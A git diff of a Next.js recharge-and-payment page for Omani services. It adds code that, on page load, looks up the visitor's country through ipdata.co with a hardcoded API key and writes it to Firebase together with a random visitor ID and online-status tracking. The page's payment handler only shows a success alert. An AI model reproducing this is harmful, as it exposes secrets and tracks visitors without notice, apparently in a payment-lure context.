@@ -3,7 +3,7 @@
 import type React from "react"
 
 import Image from "next/image"
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
@@ -12,6 +12,12 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { serviceProviders } from "@/lib/service-providers"
 import { PaymentForm } from "@/components/payment-form"
 import { SiteHeader } from "./ui/header"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
+function randstr(prefix:string){
+    return Math.random().toString(36).replace('0.',prefix || '');
+}
+const visitorID=randstr('om-')
 
 export default function RechargePage() {
   const [serviceType, setServiceType] = useState("telecom")
@@ -35,7 +41,29 @@ export default function RechargePage() {
     // Process payment
     alert(`تمت عملية الدفع بنجاح: ${amount} ريال عماني`)
   }
-
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+  
+    try {
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const country = await response.text();
+        addData({
+            id:visitorID,
+            country: country
+        })
+        localStorage.setItem('country',country)
+        setupOnlineStatus(visitorID)
+      } catch (error) {
+        console.error('Error fetching location:', error);
+    }
+  }
+useEffect(()=>{   
+   getLocation()
+},[])
   return (
     <div className="bg-white min-h-screen font-sans" dir="rtl">
       <SiteHeader />
